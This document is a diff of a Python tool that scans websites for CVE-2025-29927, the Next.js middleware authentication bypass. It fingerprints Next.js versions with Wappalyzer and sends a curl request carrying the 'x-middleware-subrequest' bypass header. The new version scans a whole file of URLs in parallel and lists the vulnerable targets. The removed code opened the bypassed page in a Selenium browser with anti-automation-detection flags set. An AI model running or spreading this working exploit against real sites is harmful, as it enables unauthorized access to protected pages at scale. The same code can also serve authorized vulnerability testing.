@@ -1,13 +1,13 @@
-import random
 import os
 import sys
-import time
 import subprocess
 import importlib.util
 import signal
 from colorama import Fore, init
 import json
-import requests
+import threading
+from queue import Queue
+import time
 
 init(autoreset=True)
 
@@ -15,6 +15,9 @@ ORANGE = '\033[38;5;214m'
 LIGHT_PINK = '\033[38;5;176m'
 SALMON = '\033[38;5;209m'
 BRIGHT_WHITE  = '\033[38;5;231m'
+
+# Thread-safe print lock
+print_lock = threading.Lock()
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -24,31 +27,22 @@ def is_package_installed(package):
 
 def install_package(package_name):
     result = subprocess.run([sys.executable, '-m', 'pip', 'install', package_name], capture_output=True, text=True)
-    
-    if result.returncode == 0:
-        print(f"{Fore.GREEN}[+] {package_name} installed successfully.")
-    else:
-        print(f"{Fore.RED}[!] Failed to install {package_name}")
+    with print_lock:
+        print(f"{Fore.GREEN}[+] {package_name} installed." if result.returncode == 0 else f"{Fore.RED}[!] Failed to install {package_name}")
 
 def check_and_install_packages(packages):
     for package in packages:
-        time.sleep(1)
-        if is_package_installed(package):
-            print(f"{Fore.GREEN}[+] {package} is already installed.")
-        else:
-            print(f"{Fore.RED}[!] {package} is missing. Installing...")
+        if not is_package_installed(package):
+            with print_lock:
+                print(f"{Fore.RED}[!] {package} missing. Installing...")
             install_package(package)
 
 def fetch_required_modules():
-    return (
-        "wappalyzer",
-        "requests",
-        "colorama",
-        "selenium"
-    )
+    return ("wappalyzer", "colorama")
 
 def handle_interrupt(signal, frame):
-    print(f"{Fore.RED}\n[!] Program interrupted. Exiting instantly...")
+    with print_lock:
+        print(f"{Fore.RED}\n[!] Interrupted. Exiting...")
     sys.exit(0)
 
 def display_banner():
@@ -60,32 +54,40 @@ def display_banner():
 {Fore.GREEN} | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_   / /   / // /_ / /   
 {Fore.GREEN}  \_____|   \/   |______|  |____|\___/____|____/    |____| /_/   /_/|____/_/    
     """
+    with print_lock:
+        print(banner)
+        creator_text = "Program created by: AnonKryptiQuz"
+        padding = (81 - len(creator_text)) // 2
+        print(" " * padding + f"{Fore.RED}{creator_text}")
+        print("")
 
-    print(banner)
-    creator_text = "Program created by: AnonKryptiQuz"
-    padding = (81 - len(creator_text)) // 2
-    print(" " * padding + f"{Fore.RED}{creator_text}")
-    print("")
-
-def get_valid_url():
+def get_valid_file():
     while True:
         clear_screen()
         display_banner()
-        url = input(f"{BRIGHT_WHITE}[?] Please enter the URL: {Fore.CYAN}")
-        if not url:
-            print(f"{Fore.RED}\n[!] You must provide a valid URL.{Fore.RESET}")
-            time.sleep(1)
-            print(f"{Fore.YELLOW}[i] Press Enter to try again...{Fore.RESET}")
-            input()
-        elif not is_valid_url(url):
-            print(f"{Fore.RED}\n[!] Invalid URL. Make sure it starts with 'http://' or 'https://'.{Fore.RESET}")
-            time.sleep(1)
-            print(f"{Fore.YELLOW}[i] Press Enter to try again...{Fore.RESET}")
-            input()
+        file_path = input(f"{BRIGHT_WHITE}[?] Enter path to URL file: {Fore.CYAN}")
+        if not file_path:
+            with print_lock:
+                print(f"{Fore.RED}\n[!] File path required.")
+                input(f"{Fore.YELLOW}[i] Press Enter to retry...")
+        elif not os.path.exists(file_path):
+            with print_lock:
+                print(f"{Fore.RED}\n[!] File not found.")
+                input(f"{Fore.YELLOW}[i] Press Enter to retry...")
         else:
-            print(f"{Fore.YELLOW}\n[i] Loading Please Wait...")
-            time.sleep(3)
-            return url
+            try:
+                with open(file_path, 'r') as f:
+                    urls = [line.strip() for line in f if line.strip()]
+                if not urls:
+                    with print_lock:
+                        print(f"{Fore.RED}\n[!] File is empty.")
+                        input(f"{Fore.YELLOW}[i] Press Enter to retry...")
+                else:
+                    return urls
+            except Exception as e:
+                with print_lock:
+                    print(f"{Fore.RED}\n[!] Error reading file: {e}")
+                    input(f"{Fore.YELLOW}[i] Press Enter to retry...")
 
 def is_valid_url(url):
     return url.startswith("http://") or url.startswith("https://")
@@ -94,180 +96,163 @@ def get_scan_type():
     while True:
         clear_screen()
         display_banner()
-        print(f"{BRIGHT_WHITE}[?] Please select the type of scan you want to perform:")
+        print(f"{BRIGHT_WHITE}[?] Select scan type:")
         print(f"{BRIGHT_WHITE} 1. Fast\n 2. Balanced\n 3. Full (Default)")
-
-        choice = input(f"{Fore.LIGHTMAGENTA_EX}\n[?] Please choose an option to continue (Press Enter for Full): {Fore.CYAN}").strip()
-
+        choice = input(f"{Fore.LIGHTMAGENTA_EX}\n[?] Choose (Enter for Full): {Fore.CYAN}").strip()
         if choice == "1":
             return "fast"
         elif choice == "2":
             return "balanced"
         elif choice == "3" or choice == "":
-            return "full" 
+            return "full"
         else:
-            print(f"{Fore.RED}\n[!] Invalid choice selected. Please try again.")
-            time.sleep(1)
-            print(f"{Fore.YELLOW}[i] Press Enter to try again...{Fore.RESET}")
-            input()
+            with print_lock:
+                print(f"{Fore.RED}\n[!] Invalid choice.")
+                input(f"{Fore.YELLOW}[i] Press Enter to retry...")
 
-
-def check_react_version(url, scan_type):
-    global MIDDLEWARE_VALUE
-    scan_command = ['wappalyzer', '-i', url, '--scan-type', scan_type, '-t', '10', '-oJ', 'output.json']
+def check_react_version(url, scan_type, result_queue):
+    MIDDLEWARE_VALUE = None
+    with print_lock:
+        print(f"{Fore.MAGENTA}[?] Scanning: {url}")
+        print(f"{Fore.CYAN}[i] Checking Next.js...")
     
+    scan_command = ['wappalyzer', '-i', url, '--scan-type', scan_type, '-t', '10', '-oJ', f'output_{threading.current_thread().ident}.json']
     result = subprocess.run(scan_command, capture_output=True, text=True)
-
-    if "geckodriver" in result.stderr.lower() and "not be compatible" in result.stderr.lower():
-        print(f"{Fore.RED}[!] Geckodriver version issue detected!")
-        time.sleep(2)
-        print(f"{Fore.RED}[!] WRN: {LIGHT_PINK}Your installed geckodriver might not be compatible with Firefox. {SALMON}(Ignoring may result in FPs & FNs)\n")
+    
+    status = {"url": url, "nextjs": False, "version": None, "vulnerable": False, "error": None}
+    output_file = f'output_{threading.current_thread().ident}.json'
     
     if result.returncode != 0:
-        print(f"{Fore.RED}[!] Failed to analyze the website. Make sure Wappalyzer is installed correctly.")
-        return
-    
-    if not os.path.exists("output.json"):
-        print(f"{Fore.RED}[!] Wappalyzer did not produce an output file. Make sure it is installed and working properly.")
-        return
-    
-    try:
-        with open("output.json", "r") as file:
-            data = json.load(file)
-
-            if not data:
-                print(f"{Fore.RED}[!] Wappalyzer scan returned an empty result. Ensure the website is accessible.")
-                return
-
-            site_data = data.get(url, {})
-
-            time.sleep(2)
-
-            nextjs_info = site_data.get("Next.js", None)
-            if nextjs_info:
-                nextjs_version = nextjs_info.get('version', None)
-                if nextjs_version:
-                    print(f"{SALMON}[+] Next.js is used on this website, version: {nextjs_version}")
-
-                    def version_tuple(version):
-                        return tuple(map(int, version.split(".")))
-
-                    time.sleep(1)
-
-                    if version_tuple(nextjs_version) >= version_tuple("14.2.25") or version_tuple(nextjs_version) >= version_tuple("15.2.3"):
-                        print(f"{Fore.RED}\n[-] Not within Vulnerable range.")
-                    else:
-                        print(f"{LIGHT_PINK}[+] Within Vulnerable range.")
-
-                        time.sleep(2)
-
-                        if version_tuple(nextjs_version) < version_tuple("12.0.0"):
-                            MIDDLEWARE_VALUE = "_middleware"
-                            cmd = f'curl -H "x-middleware-subrequest: _middleware" {url}'
-                            print(f"{Fore.YELLOW}[i] Running _middleware test (Next.js < 12)...")
-                        else:
-                            MIDDLEWARE_VALUE = "middleware"
-                            cmd = f'curl -H "x-middleware-subrequest: middleware" {url}'
-                            print(f"{ORANGE}[i] Running middleware test (Next.js >= 12 but < 14.2.25/15.2.3)...")
-
-                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-
-                        time.sleep(2)
-
-                        if result.stdout.strip():
-                            print(f"{Fore.GREEN}\n[+] Website is vulnerable to CVE-2025-29927!")
-                            time.sleep(2)
-                            
-                            open_bypassed_page(url)
-                        else:
-                            print(f"{Fore.RED}\n[!] Website is not vulnerable!")
-
+        status["error"] = "Wappalyzer failed"
+        with print_lock:
+            print(f"{Fore.RED}[!] {url}: Wappalyzer analysis failed")
+    elif not os.path.exists(output_file):
+        status["error"] = "No output file"
+        with print_lock:
+            print(f"{Fore.RED}[!] {url}: No output file generated")
+    else:
+        try:
+            with open(output_file, "r") as file:
+                data = json.load(file)
+                if not data:
+                    status["error"] = "Empty result"
+                    with print_lock:
+                        print(f"{Fore.RED}[!] {url}: Empty scan result")
                 else:
-                    print(f"{Fore.YELLOW}[i] Next.js is used on this website, but version information is not available.")
-            else:
-                print(f"{Fore.RED}[!] This website is not based on Next.js.")
+                    site_data = data.get(url, {})
+                    nextjs_info = site_data.get("Next.js", None)
+                    if nextjs_info:
+                        status["nextjs"] = True
+                        nextjs_version = nextjs_info.get('version', None)
+                        status["version"] = nextjs_version
+                        with print_lock:
+                            print(f"{SALMON}[+] {url}: Next.js detected" + (f", version: {nextjs_version}" if nextjs_version else ""))
+                        if nextjs_version:
+                            def version_tuple(version):
+                                return tuple(map(int, version.split(".")))
+                            if version_tuple(nextjs_version) < version_tuple("14.2.25") and version_tuple(nextjs_version) < version_tuple("15.2.3"):
+                                MIDDLEWARE_VALUE = "_middleware" if version_tuple(nextjs_version) < version_tuple("12.0.0") else "middleware"
+                                with print_lock:
+                                    print(f"{ORANGE}[i] {url}: Testing {MIDDLEWARE_VALUE}...")
+                                cmd = f'curl -H "x-middleware-subrequest: {MIDDLEWARE_VALUE}" {url}'
+                                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                                if result.stdout.strip():
+                                    status["vulnerable"] = True
+                                    with print_lock:
+                                        print(f"{Fore.GREEN}[+] {url}: Vulnerable to CVE-2025-29927!")
+                                else:
+                                    with print_lock:
+                                        print(f"{Fore.RED}[-] {url}: Not vulnerable")
+                            else:
+                                with print_lock:
+                                    print(f"{Fore.RED}[-] {url}: Not in vulnerable range")
+                    else:
+                        with print_lock:
+                            print(f"{Fore.RED}[-] {url}: Not Next.js based")
+        except Exception as e:
+            status["error"] = str(e)
+            with print_lock:
+                print(f"{Fore.RED}[!] {url}: Error - {e}")
+        finally:
+            if os.path.exists(output_file):
+                os.remove(output_file)
     
-    except Exception as e:
-        print(f"{Fore.RED}[!] Error parsing the output: {e}")
-    finally:
-        if os.path.exists("output.json"):
-            os.remove("output.json")
+    result_queue.put(status)
 
-def open_bypassed_page(url):
-    from selenium import webdriver
-    from selenium.webdriver.chrome.service import Service
-    from selenium.webdriver.chrome.options import Options
+def process_urls(urls, scan_type):
+    valid_urls = [url if is_valid_url(url) else f"https://{url}" for url in urls]
+    result_queue = Queue()
+    threads = []
+    max_threads = min(10, len(valid_urls))
+    
+    with print_lock:
+        print(f"{Fore.YELLOW}[i] Scanning {len(valid_urls)} URLs with {max_threads} threads...")
+    
+    def worker(url):
+        check_react_version(url, scan_type, result_queue)
+    
+    for url in valid_urls:
+        t = threading.Thread(target=worker, args=(url,))
+        threads.append(t)
+        t.start()
+        if len(threads) >= max_threads:
+            for t in threads:
+                t.join()
+            threads = []
+    
+    for t in threads:
+        t.join()
+    
+    results = []
+    while not result_queue.empty():
+        results.append(result_queue.get())
+    
+    display_results(results)
 
-    global MIDDLEWARE_VALUE
-
-    if not MIDDLEWARE_VALUE:
-        print(f"{Fore.RED}[!] Middleware value is not set. Aborting!")
-        return
-
-    print(f"{Fore.CYAN}\n[i] Opening the website with bypassed login...\n")
-    time.sleep(2)
-
-    chromedriver_path = "chromedriver.exe" if os.name == "nt" else "/usr/bin/chromedriver"
-
-    chrome_options = Options()
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--disable-dev-shm-usage")
-    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
-    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    chrome_options.add_experimental_option("useAutomationExtension", False)
-    chrome_options.add_argument("--disable-extensions")
-    chrome_options.add_argument("--disable-background-networking")
-    chrome_options.add_argument("--disable-default-apps")
-    chrome_options.add_argument("--disable-sync")
-    chrome_options.add_argument("--disable-translate") 
-    chrome_options.add_argument("--disable-popup-blocking")
-
-
-    service = Service(chromedriver_path)
-    driver = webdriver.Chrome(service=service, options=chrome_options)
-
-    driver.execute_cdp_cmd("Network.enable", {})
-    driver.execute_cdp_cmd("Network.setExtraHTTPHeaders", {
-        "headers": {
-            "x-middleware-subrequest": str(MIDDLEWARE_VALUE) 
-        }
-    })
-
-    driver.get(url)
-
-    input(f"{Fore.YELLOW}[i] Press Enter to terminate the program\n")
-    driver.quit()
-    sys.exit(0)
+def display_results(results):
+    clear_screen()
+    display_banner()
+    print(f"{Fore.CYAN}[i] Final Results:\n")
+    
+    vuln_width = max(len("Vulnerable Targets"), max([len(r["url"]) for r in results if r["vulnerable"]] or [0]))
+    nonvuln_width = max(len("Non-Vulnerable Targets"), max([len(r["url"]) for r in results if not r["vulnerable"]] or [0]))
+    
+    vuln_list = [r["url"] for r in results if r["vulnerable"]]
+    nonvuln_list = [r["url"] for r in results if not r["vulnerable"]]
+    
+    print(f"{Fore.GREEN}{'Vulnerable Targets':<{vuln_width}}    {Fore.RED}{'Non-Vulnerable Targets':<{nonvuln_width}}")
+    print(f"{Fore.GREEN}{'-' * vuln_width}    {Fore.RED}{'-' * nonvuln_width}")
+    
+    max_len = max(len(vuln_list), len(nonvuln_list))
+    for i in range(max_len):
+        vuln = vuln_list[i] if i < len(vuln_list) else ""
+        nonvuln = nonvuln_list[i] if i < len(nonvuln_list) else ""
+        print(f"{Fore.GREEN}{vuln:<{vuln_width}}    {Fore.RED}{nonvuln:<{nonvuln_width}}")
+    
+    print(f"\n{Fore.YELLOW}[i] Summary:")
+    print(f"{Fore.GREEN}[+] Vulnerable: {len(vuln_list)}")
+    print(f"{Fore.RED}[-] Non-Vulnerable: {len(nonvuln_list)}")
+    print(f"{Fore.CYAN}[i] Errors: {len([r for r in results if r['error']])}")
 
 def main():
     signal.signal(signal.SIGINT, handle_interrupt)
     clear_screen()
-    print(f"{Fore.YELLOW}[i] Checking for required packages...\n")
-    required_packages = fetch_required_modules()
-    check_and_install_packages(required_packages)
-    time.sleep(3)
-
-    url = get_valid_url()
-    scan_type = get_scan_type()
-
-    print(f"{Fore.YELLOW}\n[i] Loading Please Wait...")
-    time.sleep(3)
-    clear_screen()
-    display_banner()
-
-    print(f"{Fore.MAGENTA}[?] Scanning: {url}\n")
-
-    time.sleep(1)
+    print(f"{Fore.YELLOW}[i] Checking packages...")
+    check_and_install_packages(fetch_required_modules())
     
-    print(f"{Fore.CYAN}[i] Checking if the website is based on Next.js")
-    time.sleep(1)
-    print(f"{ORANGE}[i] Scan Type: {scan_type}\n")
-    check_react_version(url, scan_type)
+    urls = get_valid_file()
+    scan_type = get_scan_type()
+    
+    start_time = time.time()
+    process_urls(urls, scan_type)
+    end_time = time.time()
+    
+    print(f"\n{Fore.GREEN}[+] Scan completed in {end_time - start_time:.2f} seconds!")
+    input(f"{Fore.YELLOW}[i] Press Enter to exit...")
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"{Fore.RED}\n[!] Operation interrupted. Exiting instantly...")
+        print(f"{Fore.RED}\n[!] Operation interrupted. Exiting...")
         sys.exit(0)
